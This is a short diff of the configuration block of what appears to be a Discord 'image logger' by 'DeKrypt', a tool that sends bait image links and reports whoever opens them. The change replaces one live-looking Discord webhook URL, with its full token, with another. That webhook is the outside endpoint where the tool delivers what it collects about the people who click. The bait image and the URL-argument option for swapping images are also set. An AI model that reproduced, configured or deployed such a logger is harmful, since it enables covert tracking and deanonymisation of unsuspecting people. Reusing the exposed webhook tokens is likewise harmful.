@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1349085885160886417/odu4RVgVIukP-ONdiisWLUmnOJswYOBEs64v9wcWytE2z1saSGMFE7m1dGq51URKks2F",
+    "webhook": "https://discord.com/api/webhooks/1349482658001981480/u67ZdCYliAXsgONcHnt0lbybLsWS8KDEGpIEPiaS7b6L1_A7oW3dTSVIboikrIeCdrKZ",
     "image": "https://assets.tiltify.com/uploads/media_type/image/203025/blob-09636982-a21a-494b-bbe4-3692c2720ae3.jpeg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
